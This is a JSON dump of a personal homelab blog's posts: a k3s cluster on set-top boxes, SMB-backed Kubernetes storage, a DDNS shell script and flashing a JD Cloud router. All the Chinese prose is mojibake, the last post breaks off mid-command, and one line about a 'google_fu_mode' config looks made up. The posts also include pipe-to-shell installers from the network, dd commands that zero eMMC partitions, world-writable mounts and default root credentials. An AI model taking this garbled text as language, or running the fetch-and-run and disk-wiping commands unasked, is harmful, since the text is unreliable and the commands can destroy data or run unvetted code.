{"posts":[{"title":"K8Sä¸­æŒ‚è½½SMBå…±äº«ä½œä¸ºStorageClass","content":"ä¸Šå‘¨åœ¨æœºé¡¶ç›’ä¸Šéƒ¨ç½²äº†ä¸€å¥—k3sé›†ç¾¤ï¼Œç”±äºä¸¤ä¸ªæœºé¡¶ç›’éƒ½åªæœ‰8Gçš„EMMCï¼Œæ‰€ä»¥æˆ‘æƒ³è¦æŠŠåˆ·äº†DWRTå›ºä»¶çš„äº¬ä¸œäº‘è·¯ç”±å™¨çš„256Gå­˜å‚¨ç©ºé—´ä½œä¸ºSMBå…±äº«ç»™é›†ç¾¤ä½¿ç”¨ï¼Œä»åˆ›å»ºSCã€åˆ›å»ºPVCï¼Œéƒ¨ç½²Deploymentï¼Œä¸€åˆ‡éƒ½å¾ˆé¡ºåˆ©ï¼Œä½†æ˜¯æˆ‘éƒ¨ç½²çš„ä¸¤ä¸ªé¡¹ç›®ï¼Œä¸€ä¸ªAlistï¼Œä¸€ä¸ªQDæ¡†æ¶ï¼Œåœ¨ä½¿ç”¨localstorageæ—¶éƒ½èƒ½æ­£å¸¸è¿è¡Œï¼Œè€Œä½¿ç”¨SMBå…±äº«æ—¶éƒ½ä¼šèµ·ä¸æ¥ æŸ¥çœ‹æ—¥å¿—éƒ½æ˜¯sqlite3æ— æ³•å†™database.dbæ–‡ä»¶ï¼Œäºæ˜¯æˆ‘å¦å¤–éƒ¨ç½²äº†ä¸€ä¸ªsqlite3çš„Deploymentï¼Œè¿›å…¥podæ’æŸ¥ touch testfile echo â€œtestâ€ &gt; testfile cat testfile æ–‡ä»¶å¯ä»¥æ­£å¸¸åˆ›å»ºã€å†™å…¥å’Œè¯»å–ï¼Œä½†ä½¿ç”¨sqlite3åˆ›å»ºdata.dbã€åˆ›å»ºè¡¨å´ä¼šæŠ¥é”™ sqlite3 data.db create table test (id integer primary key, name text); insert into test (name) values ('Alice'); insert into test (name) values ('Bob'); select * from test; Error: unable to open database &quot;data.db&quot;: unable to open database file å›°æ‰°äº†ä¸€å‘¨ï¼Œè¿˜æ˜¯æ²¡èƒ½è§£å†³ï¼Œç°åœ¨å…ˆä½¿ç”¨localstorageï¼Œç­‰è¿‡æ®µæ—¶é—´å†å›æ¥çœ‹çœ‹ğŸ˜“ å®‰è£… csi-driver-smb # æ·»åŠ  Helm ä»“åº“ï¼š helm repo add csi-driver-smb https://raw.githubusercontent.com/kubernetes-csi/csi-driver-smb/master/charts helm repo update # å®‰è£… csi-driver-smbï¼š helm install csi-driver-smb csi-driver-smb/csi-driver-smb --namespace kube-system # æ£€æŸ¥ csi-smb-controller å’Œ csi-smb-node çš„æ—¥å¿— kubectl logs -n kube-system -l app=csi-smb-controller kubectl logs -n kube-system -l app=csi-smb-node smb-secret.yaml apiVersion: v1 kind: Secret metadata: name: smb-secret namespace: gutf stringData: username: &quot;guest&quot; password: &quot;&quot; smb-storageclass.yaml apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: smb provisioner: smb.csi.k8s.io parameters: source: &quot;//192.168.123.1/mmcblk0p24&quot; csi.storage.k8s.io/node-stage-secret-name: &quot;smb-secret&quot; csi.storage.k8s.io/node-stage-secret-namespace: &quot;gutf&quot; csi.storage.k8s.io/node-publish-secret-name: &quot;smb-secret&quot; csi.storage.k8s.io/node-publish-secret-namespace: &quot;gutf&quot; reclaimPolicy: Retain # only retain is supported volumeBindingMode: Immediate mountOptions: - dir_mode=0777 - file_mode=0777 - uid=1000 - gid=1000 - vers=3.0 smb-pvc.yaml apiVersion: v1 kind: Secret metadata: name: smb-secret namespace: gutf stringData: username: &quot;guest&quot; password: &quot;&quot; root@k3s-master-octupos:/opt/testsmb# cat smb-pvc.yaml apiVersion: v1 kind: PersistentVolumeClaim metadata: name: smb-pvc namespace: gutf spec: accessModes: - ReadWriteMany resources: requests: storage: 1Gi storageClassName: smb sqlite3-deployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: sqlite3-test namespace: gutf spec: replicas: 1 selector: matchLabels: app: sqlite3-test template: metadata: labels: app: sqlite3-test spec: securityContext: fsGroup: 1000 # è®¾ç½®æ–‡ä»¶ç³»ç»Ÿç»„ initContainers: - name: init-permissions image: busybox:1.32.0-uclibc command: [&quot;sh&quot;, &quot;-c&quot;, &quot;chown -R 1000:1000 /data &amp;&amp; chmod -R 777 /data&quot;] volumeMounts: - mountPath: /data name: smb-volume containers: - name: sqlite3 image: keinos/sqlite3 securityContext: runAsUser: 1000 # è®¾ç½®è¿è¡Œç”¨æˆ· runAsGroup: 1000 # è®¾ç½®è¿è¡Œç»„ command: [&quot;sh&quot;, &quot;-c&quot;, &quot;while true; do sleep 3600; done&quot;] volumeMounts: - mountPath: /data name: smb-volume volumes: - name: smb-volume persistentVolumeClaim: claimName: smb-pvc ","link":"https://hellogu.github.io/post/k8s-zhong-gua-zai-smb-gong-xiang-zuo-wei-storageclass/"},{"title":"èŠ±ç”Ÿå£³DDNSæ›´æ–°shellè„šæœ¬","content":"å‰å¤©ç»™äº¬ä¸œäº‘è·¯ç”±å™¨åˆ·äº†è¿™ä¸ªDWRTï¼Œå¼€å¯äº†clashï¼Œç„¶åDDNSæ’ä»¶è·å–çš„ipå°±å˜æˆäº†ä»£ç†ipï¼Œå¯¼è‡´æ— æ³•æ­£å¸¸å¤–ç½‘è®¿é—®æˆ‘å±€åŸŸç½‘ä¸­éƒ¨ç½²çš„æœåŠ¡ï¼ŒDDNSæ’ä»¶è®¾ç½®ä»wanå£è·å–ipä¸€ç›´æ— æ³•ä¿å­˜ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯æ’ä»¶çš„BUGè¿˜æ˜¯å›ºä»¶çš„BUGï¼Œæ²¡å®åŠ›æ’é”™ï¼Œåªèƒ½æ¢ä¸ªæ³•å­å®ç°ğŸ˜… å…·ä½“å®ç°åŠæ³•ï¼šåœ¨ä¸èµ°ä»£ç†çš„æœåŠ¡å™¨ä¸Šå®šæ—¶è¿è¡Œshellæ¥æ›´æ–°DDNSï¼Œå¹¶ä¸”ä¸ºäº†è´¯å½»â€œèƒ½ç”¨é¼ æ ‡ç‚¹å°±ä¸è¦æ•²é”®ç›˜â€çš„æ€æƒ³ï¼Œå®šæ—¶ç”¨1panelé¢æ¿çš„å®šæ—¶ä»»åŠ¡å®ç° ä»¥ä¸‹ä»£ç æ¥è‡ªchatgpt #!/bin/bash # å‡è®¾ä½ å·²ç»ä¸ºä»¥ä¸‹å˜é‡èµ‹äº†å€¼ USERNAME=&quot;your_username&quot; PASSWORD=&quot;your_password&quot; YOURHOSTNAME=&quot;your_hostname&quot; # è·å–å½“å‰å…¬ç½‘IPåœ°å€ WANIP=$(curl -m 5 -sS -X GET http://checkip.dyndns.com | grep -oP 'Current IP Address: \\d+\\.\\d+\\.\\d+\\.\\d+' | cut -d ' ' -f 4) # æ£€æŸ¥WANIPå˜é‡æ˜¯å¦æˆåŠŸè·å–åˆ°IPåœ°å€ if [ -z &quot;$WANIP&quot; ]; then echo &quot;Error: Unable to retrieve WAN IP address.&quot; exit 1 fi # æ„å»ºè¯·æ±‚çš„URL URL=&quot;http://${USERNAME}:${PASSWORD}@ddns.oray.com/ph/update?hostname=${YOURHOSTNAME}&amp;myip=${WANIP}&quot; # ä½¿ç”¨curlå‘é€è¯·æ±‚åˆ°DDNSæä¾›å•†ï¼Œå¹¶åˆ†åˆ«è·å–HTTPçŠ¶æ€ç å’Œå“åº”å†…å®¹ HTTP_STATUS=$(curl -sS -o /dev/stdout -w &quot;%{http_code}&quot; -u &quot;${USERNAME}:${PASSWORD}&quot; &quot;${URL}&quot;) RESPONSE=$(curl -sS -u &quot;${USERNAME}:${PASSWORD}&quot; &quot;${URL}&quot;) # è¾“å‡ºHTTPçŠ¶æ€ç å’Œå“åº”å†…å®¹ echo &quot;HTTP Response Code: $HTTP_STATUS&quot; echo &quot;Response: $RESPONSE&quot; # ä»RESPONSEä¸­åˆ†ç¦»çŠ¶æ€ç å’ŒIPåœ°å€ RESPONSE_STATUS=$(echo &quot;$RESPONSE&quot; | awk '{print $1}') IP_ADDRESS=$(echo &quot;$RESPONSE&quot; | awk '{print $2}') HTTP_RESPONSE_IP=$(echo &quot;$RESPONSE&quot; | awk -F'[^0-9]*$' '{print $1}') # è¾“å‡ºåˆ†ç¦»åçš„çŠ¶æ€ç å’ŒIPåœ°å€ echo &quot;Response Status: $RESPONSE_STATUS&quot; echo &quot;IP Address: $IP_ADDRESS&quot; # æ ¹æ®è¿”å›çš„å“åº”çŠ¶æ€åˆ¤æ–­æ“ä½œç»“æœ case &quot;$RESPONSE_STATUS&quot; in &quot;good&quot;) echo &quot;DDNS update successful. Your IP has been updated to: $IP_ADDRESS&quot; ;; &quot;nochg&quot;) echo &quot;DDNS update successful, but no IP change.&quot; ;; # å¤„ç†å…¶ä»–å“åº”çŠ¶æ€... *) echo &quot;Unexpected response: $RESPONSE_STATUS&quot; ;; esac ","link":"https://hellogu.github.io/post/hua-sheng-ke-ddns-geng-xin-shell-jiao-ben/"},{"title":"åœ¨æœºé¡¶ç›’ä¸Šéƒ¨ç½²ä¸€å¥—k3sé›†ç¾¤","content":"æ¡åƒåœ¾å¥½å¤šå¹´ï¼Œæ”’äº†å¥½å¤šä¸ªæœºé¡¶ç›’ï¼Œéƒ½å¯ä»¥è¿è¡Œarmbianç³»ç»Ÿï¼Œä½†æ¯ä¸ªç›’å­çš„ç£ç›˜éƒ½åªæœ‰8Gï¼Œç”¨æ¥è·‘dockeræœåŠ¡æ²¡å‡ ä¸ªå°±ç£ç›˜æ»¡äº†ï¼Œè€æ˜¯è¦æˆ‘æ¥è§„åˆ’å“ªäº›ä¸ªæœåŠ¡è·‘åœ¨å“ªä¸ªæœºé¡¶ç›’ä¸Šï¼Œè¿˜è¦åœ¨è·¯ç”±å™¨ä¸Šè®¾ç½®ç«¯å£è½¬å‘ï¼Œååˆ†å¾—ä¸ä¼˜é›…ï¼Œæ€¥éœ€éƒ¨ç½²ä¸€å¥—é›†ç¾¤æ¥è‡ªåŠ¨ç¼–æ’è¿™äº›dockeråº”ç”¨ï¼Œå¹¶ä¸”ä¾¿å®œçš„æœºé¡¶ç›’å¦‚Q5ä»…éœ€50å…ƒä¸€ä¸ªï¼Œä»¥åèµ„æºä¸å¤Ÿäº†åŠ æœºä¹Ÿå¾ˆæ–¹ä¾¿ï¼Œè¿˜èƒ½æŒ‚è½½å±€åŸŸç½‘ä¸­çš„å…±äº«å­˜å‚¨ç»™é›†ç¾¤ä½¿ç”¨ï¼Œéå¸¸çš„ç°ä»£åŒ– hostname IP å‹å· CPUå†…å­˜é…ç½® ç£ç›˜ Role k3s-master-octupos 192.168.123.3 ç« é±¼æ˜Ÿçƒ 8C2G 8G Master k3s-worker-n1 192.168.123.4 æ–è®¯N1 4C2G 8G Worker 1.ç³»ç»Ÿå‡†å¤‡ ä¸‹è½½ç« é±¼æ˜Ÿçƒå’Œæ–è®¯N1çš„armbiané•œåƒophub/amlogic-s9xxx-armbian ä½¿ç”¨balenaEtcherå†™å…¥Uç›˜ æœºé¡¶ç›’æ’å…¥Uç›˜ï¼Œä¸Šç”µå¼€æœºï¼Œå¦‚æœæœºé¡¶ç›’ä¸­å·²ç»æ˜¯armbianæˆ–openwrtç³»ç»Ÿä¼šé»˜è®¤ä»Uç›˜å¯åŠ¨ï¼Œå¦‚æœæ˜¯å®‰å“ç³»ç»Ÿï¼Œå¯ä»¥å®‰è£…Reboot to liberelecï¼ˆéœ€è¦rootæƒé™ï¼‰ä»Uç›˜å¯åŠ¨ æ‰§è¡Œå‘½ä»¤åˆ·å…¥armbianç³»ç»Ÿarmbian-installï¼Œåˆ·å†™å®Œè¾“å…¥å‘½ä»¤poweroffå…³æœºï¼Œæ‹”å‡ºUç›˜é‡æ–°ä¸Šç”µ 2.éƒ¨ç½²k3s MasterèŠ‚ç‚¹ å‚è€ƒgeekhourçš„æ•™ç¨‹ # å®‰è£…k3sçš„masterèŠ‚ç‚¹ curl -sfL https://get.k3s.io | sh - # å¦‚æœå®‰è£…å¤±è´¥å¯ä»¥ä½¿ç”¨ranherçš„é•œåƒæºæ¥å®‰è£… curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn sh - # å®‰è£…å®ŒæˆåæŸ¥çœ‹é›†ç¾¤çŠ¶æ€ kubectl get nodes # æŸ¥çœ‹tokenï¼Œåœ¨ä¸‹ä¸€æ­¥åˆ›å»ºworkerèŠ‚ç‚¹æ—¶éœ€è¦è®¤è¯ cat /var/lib/rancher/k3s/server/node-token 3.éƒ¨ç½²workerèŠ‚ç‚¹ éœ€è¦ç”¨åˆ°tokenå’ŒMasterèŠ‚ç‚¹çš„ipï¼Œåœ¨geekhourçš„æ•™ç¨‹ä¸­éƒ¨ç½²äº†å¤šä¸ªworkerèŠ‚ç‚¹ï¼Œæ‰€ä»¥å°†tokenå’Œipå†™å…¥åˆ°äº†ç¯å¢ƒå˜é‡ä¸­ï¼Œåˆ©ç”¨forå¾ªç¯ç»™å¤šä¸ªworkerè¿›è¡Œéƒ¨ç½²ï¼Œæˆ‘æš‚æ—¶åªæœ‰ä¸€ä¸ªworkerï¼Œç›´æ¥è¾“å…¥tokenå’Œipä¹Ÿå¯ä»¥ export MASTER_IP=192.168.123.3 export TOKEN=éƒ¨ç½²MasterèŠ‚ç‚¹æ—¶è·å–çš„token bash -c &quot;curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn K3S_URL=\\&quot;https://$MASTER_IP:6443\\&quot; K3S_TOKEN=\\&quot;$TOKEN\\&quot; sh -&quot; æ­¤æ—¶å†å»MasterèŠ‚ç‚¹ä¸Šæ‰§è¡Œkubectl get nodeå¯ä»¥çœ‹åˆ°é›†ç¾¤ä¸€ä¸»ä¸€ä»ä¸¤ä¸ªèŠ‚ç‚¹å·²ç»ready ä½†æ˜¯åœ¨workerèŠ‚ç‚¹ä¸Šæ‰§è¡Œkubectl get nodeå‡ºç°äº†æŠ¥é”™ 4.è§£å†³workerèŠ‚ç‚¹æ— æ³•æ‰§è¡Œkubectlå‘½ä»¤ è¯¢é—®chatgptï¼Œç»™å‡ºçš„è§£å†³åŠæ³•å¦‚ä¸‹ï¼š ç¡®è®¤workerèŠ‚ç‚¹çš„kubectlé…ç½®kubectl config view ä»kubectl config viewçš„è¾“å‡ºæ¥çœ‹ï¼ŒworkerèŠ‚ç‚¹çš„kubectlé…ç½®ä¸ºç©ºï¼Œéœ€è¦ä»masterèŠ‚ç‚¹è·å–ä¸€ä»½æ­£ç¡®çš„é…ç½®ï¼Œåœ¨ K3s é›†ç¾¤ä¸­ï¼Œé»˜è®¤çš„ Kubeconfig æ–‡ä»¶ä½äº /etc/rancher/k3s/k3s.yamlã€‚æˆ‘éœ€è¦å°†è¿™ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°ä½ çš„ç”¨æˆ·ç›®å½•ä¸­ï¼Œå¹¶è®¾ç½® KUBECONFIG ç¯å¢ƒå˜é‡æŒ‡å‘å®ƒã€‚ å¤åˆ¶k3s.yamlåˆ°workerèŠ‚ç‚¹mkdir -p ~/.kube scp root@192.168.123.3:/etc/rancher/k3s/k3s.yaml ~/.kube/config ä¿®æ”¹æ–‡ä»¶æƒé™ ç¡®ä¿kubectlå¯ä»¥è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œè®¾ç½®æ­£ç¡®çš„æ–‡ä»¶æƒé™ï¼šchmod 600 ~/.kube/config è®¾ç½®KUBECONFIGç¯å¢ƒå˜é‡ ç¡®ä¿ä½ çš„KUBECONFIGç¯å¢ƒå˜é‡æŒ‡å‘è¿™ä¸ªé…ç½®æ–‡ä»¶ã€‚ä½ å¯ä»¥åœ¨ç»ˆç«¯ä¸­ä¸´æ—¶è®¾ç½®å®ƒï¼Œæˆ–è€…å°†å…¶æ·»åŠ åˆ°ä½ çš„shellé…ç½®æ–‡ä»¶ï¼ˆä¾‹å¦‚.bashrcæˆ–.zshrcï¼‰ä¸­ï¼šexport KUBECONFIG=$HOME/.kube/config å¦‚æœä½ å¸Œæœ›è¿™ä¸ªè®¾ç½®åœ¨æ¯æ¬¡ç™»å½•æ—¶éƒ½ç”Ÿæ•ˆï¼Œå¯ä»¥å°†ä¸Šé¢çš„å‘½ä»¤æ·»åŠ åˆ°ä½ çš„shellé…ç½®æ–‡ä»¶ä¸­ã€‚ä¾‹å¦‚ï¼Œç¼–è¾‘.bashrcæ–‡ä»¶ï¼šecho 'export KUBECONFIG=$HOME/.kube/config' &gt;&gt; ~/.bashrc source ~/.bashrc éªŒè¯é…ç½® ç°åœ¨ä½ å¯ä»¥éªŒè¯kubectlæ˜¯å¦å·²ç»æ­£ç¡®é…ç½®å¹¶èƒ½å¤Ÿè¿æ¥åˆ°ä½ çš„K3sé›†ç¾¤ã€‚ 5.å®‰è£…Helm Helmå®‰è£…åœ¨ä»»ä½•å¯ä»¥è®¿é—® Kubernetes é›†ç¾¤çš„æœºå™¨ä¸Šï¼Œä¸ä¸€å®šè¦å®‰è£…åœ¨MasterèŠ‚ç‚¹ä¸Š æ‰§è¡Œå‘½ä»¤curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash 6.å®‰è£…cert-manager # æ·»åŠ Helm Chartä»“åº“ helm repo add &quot;stable&quot; &quot;https://charts.helm.sh/stable&quot; --force-update helm repo add rancher-stable https://releases.rancher.com/server-charts/stable # å®šä¹‰ä¸€ä¸ªKubernetesåç§°ç©ºé—´ï¼ŒChartåˆ›å»ºçš„èµ„æºåº”è¯¥å®‰è£…åœ¨è¿™ä¸ªåç§°ç©ºé—´ä¸­ï¼šcattle-system kubectl create namespace cattle-system # å®‰è£…cert-manager kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.14.5/cert-manager.crds.yaml # Add the Jetstack Helm repository helm repo add jetstack https://charts.jetstack.io # Update your local Helm chart repository cache helm repo update # Install the cert-manager Helm chart helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace masterç‚¹ä¹ŸæŠ¥äº†è¿™ä¸ªè¿æ¥è¶…æ—¶çš„é”™ï¼Œå†æŠŠæ­¥éª¤4ä¸­chatgptç»™å‡ºçš„è§£å†³åŠæ³•åœ¨masterèŠ‚ç‚¹ä¹Ÿæ“ä½œä¸€é mkdir -p $HOME/.kube sudo cp /etc/rancher/k3s/k3s.yaml $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config export KUBECONFIG=$HOME/.kube/config echo 'export KUBECONFIG=$HOME/.kube/config' &gt;&gt; ~/.bashrc source ~/.bashrc é‡æ–°å®‰è£…cert-manager helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace åˆæŠ¥äº†ä¸ªç­‰å¾…è¶…æ—¶çš„é”™ï¼Œä½†æ˜¯æŸ¥çœ‹cert-managerå‘½åç©ºé—´ä¸‹çš„èµ„æºï¼Œéƒ½æŒºå¥åº·ï¼Œå¯èƒ½æ˜¯ç”±äºæœºé¡¶ç›’æ€§èƒ½å¤ªå¼±èµ·æ¥çš„å¤ªæ…¢å¯¼è‡´è¶…æ—¶ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥è¿›è¡Œä¸‹ä¸€æ­¥ é‡è£…å®Œk3s 1.28ç‰ˆæœ¬ååˆè¯•äº†ä¸€éï¼Œåº”è¯¥ç¡®å®æ˜¯å› ä¸ºpodå¯åŠ¨å¾—æ…¢äº† 7.å®‰è£…Rancher helm install rancher rancher-stable/rancher --namespace cattle-system --set hostname=rancher.tianfeng.com èšŒåŸ ä½äº†ğŸ˜°ç«Ÿç„¶è¦ç‰ˆæœ¬ä½äº1.29.0 8.å¸è½½k3sï¼Œé‡è£…ä½ç‰ˆæœ¬ æŒ‰ç…§å®˜æ–¹æ–‡æ¡£æ¥æ“ä½œ å¯ä»¥å…ˆåœæ­¢k3sæœåŠ¡å†è¿›è¡Œå¸è½½ sudo systemctl stop k3s sudo systemctl disable k3s é‡æ–°å®‰è£…ä½äº1.29çš„k3sï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨æœ€åä¸€ä¸ª1.28ç‰ˆæœ¬ # é‡æ–°å®‰è£…masterèŠ‚ç‚¹çš„k3s curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn INSTALL_K3S_VERSION=v1.28.9+k3s1 sh - workerèŠ‚ç‚¹ï¼š export MASTER_IP=192.168.123.3 export TOKEN=éƒ¨ç½²MasterèŠ‚ç‚¹æ—¶è·å–çš„token bash -c &quot;curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn INSTALL_K3S_VERSION=v1.28.9+k3s1 K3S_URL=\\&quot;https://$MASTER_IP:6443\\&quot; K3S_TOKEN=\\&quot;$TOKEN\\&quot; sh -&quot; 9ä½¿ç”¨portainer æœºé¡¶ç›’æ€§èƒ½å¤ªå¼±ï¼Œéƒ¨ç½²rancherä¸€ç›´æ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œæ¢æˆè½»é‡åŒ–çš„portaineræ¥ç®¡ç† ","link":"https://hellogu.github.io/post/zai-ji-ding-he-shang-bu-shu-yi-tao-k3s-ji-qun/"},{"title":"äº¬ä¸œäº‘è·¯ç”±å™¨AX1800Pro(äºšç‘Ÿ)åˆ·QWRT","content":"è‹å·è”é€šå¼€å§‹å°ç¦å®¶åº­å®½å¸¦PCDNäº†ï¼Œ3æœˆåº•ç»™æˆ‘ä¸Šä¼ é™åˆ¶åˆ°5Mï¼Œå¾®ä¿¡è§†é¢‘éƒ½å‘ä¸å‡ºå»ï¼Œè”ç³»äº†è£…æœºå°å“¥ç­¾äº†ä¸ªä¿è¯ä¹¦æ‰ç»™æˆ‘æ¢å¤ğŸ˜°è¿˜å¥½æˆ‘çš„å‡ å°äº¬ä¸œäº‘è·¯ç”±å™¨æ—©å·²å›æœ¬ï¼Œæ—¢ç„¶ä¸èƒ½èµšäº¬è±†äº†ï¼Œå°±ç›´æ¥åˆ·ç¬¬ä¸‰æ–¹ç³»ç»Ÿå§ã€‚ å¼€å§‹æˆ‘æ˜¯æƒ³è¦åˆ·ä¸ªiStoreOSçš„ï¼Œæ¯•ç«Ÿæˆ‘è¿™å°äº¬ä¸œäº‘AX1800PROå¸¦256Gçš„EMMCï¼Œæƒ³å°è¯•ä¸‹iStoreOSåšè½»NASï¼Œä½†æ˜¯æŒ‰ç…§ç½‘å‹ç»™å‡ºçš„æ•™ç¨‹å’Œå›ºä»¶ï¼ŒiStoreOSå§‹ç»ˆæ— æ³•åˆ·å…¥ï¼Œè‡ªå·±åˆæ²¡å®åŠ›æ’é”™ï¼Œåªèƒ½é»˜é»˜çš„æ¢ä¸ªå›ºä»¶åˆ·ğŸ˜…è¿˜å¥½å¯ä»¥åˆ·å¤§é›•çš„QWRTå›ºä»¶ ç®€å•è®°å½•ä¸€ä¸‹åˆ·æœºè¿‡ç¨‹ï¼Œæ–¹ä¾¿åç»­ç»§ç»­æŠ˜è…¾ å‡†å¤‡å·¥ä½œ æ­å¼€åº•éƒ¨èƒ¶å«ï¼Œæ‹§å‡º5é¢—èºä¸ å–ä¸‹åº•ç›–ï¼Œæ‹§å‡º4é¢—èºä¸ æ’¬å¼€é¡¶éƒ¨ä¸Šç›–ï¼Œæ‹§å‡º2é¢—èºä¸ æä½å¤–å£³ï¼Œä½¿å¤–å£³å¾®å¾®å½¢å˜ä¸ç½‘å£åˆ†ç¦»ï¼Œä»¥ä¾¿æŠ½å‡ºä¸»æ¿ åˆ·å…¥uboot ä¿®æ”¹ç½‘å¡IPä¸º192.168.10.1ï¼ˆæˆ–å…¶ä»–ï¼Œåªè¦ä¸ä¸‹é¢æ­¥éª¤ä¸­å‘½ä»¤ä¸­çš„ipä¸€è‡´ï¼‰ ä½¿ç”¨Tftpd64æ¶è®¾tftpæœåŠ¡å™¨ï¼Œæ”¾å…¥u-boot.mbnæ–‡ä»¶ï¼Œserver interfacesé€‰æ‹©192.168.10.1 ä½¿ç”¨CH340ä¸²å£å·¥å…·è¿æ¥ä¸»æ¿ä¸Šçš„TTLå£GND-G,T-R,R-T æ‰“å¼€MobaXtermæ–°å»ºä¸²å£è¿æ¥ï¼Œé€‰æ‹©CH340å¯¹åº”çš„COMå£ï¼Œæ³¢ç‰¹ç‡ä½115200 è·¯ç”±å™¨æ’ç”µå¼€æœºï¼Œåœ¨ä¸²å£è¿æ¥çª—å£çœ‹åˆ°æç¤ºæ—¶æŒ‰enteré”®æ‰“æ–­å¯åŠ¨ï¼ˆæ’ç”µåä¸€ç›´æŒ‰enteré”®å°±è¡Œäº†ï¼‰ï¼Œè¿›å…¥IPQ6018#å‘½ä»¤ç•Œé¢ è¾“å…¥å‘½ä»¤tftpboot u-boot.mbn ä» TFTP æœåŠ¡å™¨ä¸‹è½½åä¸º u-boot.mbn çš„æ–‡ä»¶åˆ°è®¾å¤‡ä¸Š è¾“å…¥å‘½ä»¤flash 0:APPSBL &amp;&amp; flash 0:APPSBL_1åˆ·å…¥ubootåˆ†åŒº åˆ·å…¥å›ºä»¶ åˆ·å…¥ubootä¹‹åå°±å¯ä»¥éšæ„åˆ·å›ºä»¶äº†ï¼ˆæˆ‘æµ…æ˜¾çš„ç†è§£ubootåˆ†åŒºç±»ä¼¼å®‰å“çš„recoveryåˆ†åŒºï¼Œé€šè¿‡å¯åŠ¨åˆ°recoveryåˆ†åŒºä¸­å¯ä»¥è¿›è¡Œå…¶ä»–åˆ†åŒºçš„åˆ·å†™æ“ä½œğŸ¤£ï¼‰ æŒ‰ä½ä¸»æ¿ä¸Šçš„reseté”®å†æ’å…¥è·¯ç”±å™¨ç”µæºï¼Œç­‰å¾…å‘¼å¸ç¯çº¢è‰²é—ªçƒ5ä¸‹å˜ä¸ºè“è‰²ï¼ˆå¦‚æœæ­¤æ—¶è¿˜è¿ç€TTLçš„è¯å¯ä»¥çœ‹åˆ°TTLç•Œé¢æœ‰å¯¹åº”è·³åŠ¨5ç§’åæ‰“å°å‡ºâ€œhttp server is readyâ€ï¼‰ ç”µè„‘IPè®¾ç½®ä¸º192.168.1.15ï¼ˆä¸192.168.1.1åŒç½‘æ®µå³å¯ï¼‰ æµè§ˆå™¨æ‰“å¼€192.168.1.1é€‰æ‹©å›ºä»¶ä¸Šä¼ ï¼ŒQWRTå›ºä»¶åˆ·å†™å®Œæˆåè·¯ç”±å™¨ä¼šè‡ªåŠ¨é‡å¯ï¼Œå‘¼å¸ç¯å˜ç»¿ QWRTé»˜è®¤ç®¡ç†é¡µé¢ä½192.168.1.1ï¼Œroot:password å¼€å¯ç¥ç§˜ä¸œæ–¹æ’ä»¶echo 0xDEADBEEF &gt; /etc/config/google_fu_mode å…¶ä»– æ›´æ”¹openwrtè½¯è·¯ç”±åå°ç®¡ç†åœ°å€åï¼Œå‘ç°TTYDç»ˆç«¯æ— æ³•è¿æ¥ï¼Œæ˜¾ç¤ºå·²æ‹’ç»è¿æ¥ è§£å†³æ–¹æ³•:SSHè¿›åå°ï¼Œvi /etc/init.d/ttydå°†${interface:+-i $interface} \\è¿™è¡Œæ³¨é‡Šï¼Œä¿å­˜åé‡å¯ æ‰©å®¹è½¯ä»¶åŒ…åˆ†åŒºï¼Œåˆ·å®ŒDWRTè½¯ä»¶åŒ…åˆ†åŒºåªæœ‰8MBï¼Œéœ€è¦æ‰©å®¹ä¸€ä¸‹ # å…ˆå°†gpt.binä¸Šä¼ åˆ°/tmp cd /tmp dd if=gpt.bin of=/dev/mmcblk0 bs=512 count=34 dd if=/dev/zero of=/dev/mmcblk0p2 dd if=/dev/zero of=/dev/mmcblk0p3 sync # æ“ä½œå®Œåè·¯ç”±å™¨æ–­ç”µï¼Œé‡æ–°è¿›å…¥ubootåˆ·å†™factory.binå›ºä»¶ æ‰©å®¹è½¯ä»¶åˆ†åŒºä¹‹åæœ‰200Gçš„å‰©ä½™ç©ºé—´æ²¡æœ‰æŒ‚è½½ï¼Œéœ€è¦æ‰‹åŠ¨åˆ†åŒºä¸€ä¸‹# å…ˆlsblkæŸ¥çœ‹ä¸‹ç£ç›˜ï¼Œæ²¡æœ‰lsblkçš„è¯å»è½¯ä»¶åŒ…ä¸­æœç´¢å®‰è£… lsblk # ä½¿ç”¨cddiskåˆ†åŒºï¼Œæ ¹æ®æç¤ºæ“ä½œ cfdisk /dev/mmcblk0 # åˆ›å»ºå‡ºæ¥024åˆ†åŒºï¼Œæ ¼å¼åŒ– mkfs.ext4 /dev/mmcblk0p24 # æŒ‚è½½ mount /dev/mmcblk0p24 /mnt/mmcblk0p24 # ç„¶åå»web-ç½‘ç»œå­˜å‚¨-ç½‘ç»œå…±äº«ä¸­æ·»åŠ å…±äº« å‚è€ƒé“¾æ¥ çº¯è‡ªç”¨ï¼šäº¬ä¸œäº‘æ— çº¿å®äºšç‘ŸAX1800Proæ‰©å®¹è½¯ä»¶åŒ…ç©ºé—´ï¼Œåˆ·å¤§åˆ†åŒºGPTæ–‡ä»¶ æœ¨å­ã®Blog è½¯è·¯ç”±å†è§-0æˆæœ¬ç‹—ä¸œäºšç‘ŸAX1800 proåˆ·iStoreOSæ•™ç¨‹ ","link":"https://hellogu.github.io/post/jing-dong-yun-lu-you-qi-shua-qwrt/"},{"title":"å°çˆ±éŸ³ç®±æ¥å…¥chatgpt","content":"è¿™æ˜¯ä¸€ä¸ªåœ¨githubä¸Šçœ‹åˆ°çš„å¼€æºé¡¹ç›®ï¼Œç‚¹å‡»é¡¹ç›®åœ°å€ç»™ä½œè€…ä¸€ä¸ªå¤§å¤§çš„Starå§ éƒ¨ç½²è¿‡ç¨‹ pip install -U miservice_fork -i 